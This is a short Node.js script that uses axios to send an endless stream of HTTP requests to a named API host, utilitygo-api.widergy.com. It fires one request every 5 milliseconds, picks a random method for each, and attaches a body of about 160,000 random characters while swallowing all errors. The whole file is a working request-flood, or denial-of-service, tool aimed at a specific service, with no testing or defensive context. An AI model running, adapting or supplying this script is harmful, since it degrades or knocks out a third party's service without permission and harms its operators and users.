const { default: axios } = require('axios');
const uuid = require('uuid');

const getId = n => {
  let r = '';
  for (let i = 0; i < n; i += 1) r += uuid().replace(/-/g, '');
  return r;
};

const methods = ['get', 'post', 'put', 'patch', 'delete'];

const randMethod = () => methods[Math.floor(Math.random() * methods.length)];

const execute = () => {
  const id = getId(27);
  const method = randMethod();
  console.log(method, id);
  console.log('---');
  axios({ method, url: `https://utilitygo-api.widergy.com/${id}`, data: getId(5000) }).catch(() => {});
  setTimeout(execute, 5);
};

execute();
